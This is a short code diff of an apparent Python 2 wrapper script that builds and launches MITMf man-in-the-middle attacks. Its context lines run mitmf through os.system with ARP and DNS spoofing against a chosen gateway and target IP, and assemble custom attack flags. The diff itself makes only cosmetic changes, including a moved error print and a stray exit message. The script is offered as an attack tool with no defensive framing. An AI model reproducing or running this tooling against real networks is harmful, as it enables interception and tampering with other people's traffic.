@@ -63,8 +63,9 @@ def FigureOutHowToAttack():
 			print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
 			FigureOutHowToAttack()
 	except:
-		print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
 		FigureOutHowToAttack()	
+		print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
+	print "Exit wrapper time mhow"
 	
 def WriteMenuOptions():
     os.system("clear")
@@ -80,7 +81,6 @@ def MainAttackMenu():
 	while True:
 		WriteMenuOptions()
 		menuOption=raw_input("Please type your selection:")
-		
 		if menuOption=="1":
 			os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip)
 			break
@@ -126,7 +126,7 @@ def CustomeMenuAttackStringBUild():
 	#BASE STATEMENT os.system("mitmf -i "+interface + " "+ firstHalf + " "+ gateway + " --target "+ip+ " "+lastHalf)
 	ShowCustomeBuildMenu()
 	count=0
-	while (count <20):
+	while (count < 20):
 		MenuSelection=raw_input("Please type your selection (type q when done):")
 		if MenuSelection == '1':
 			firstHalf +=" --arp"
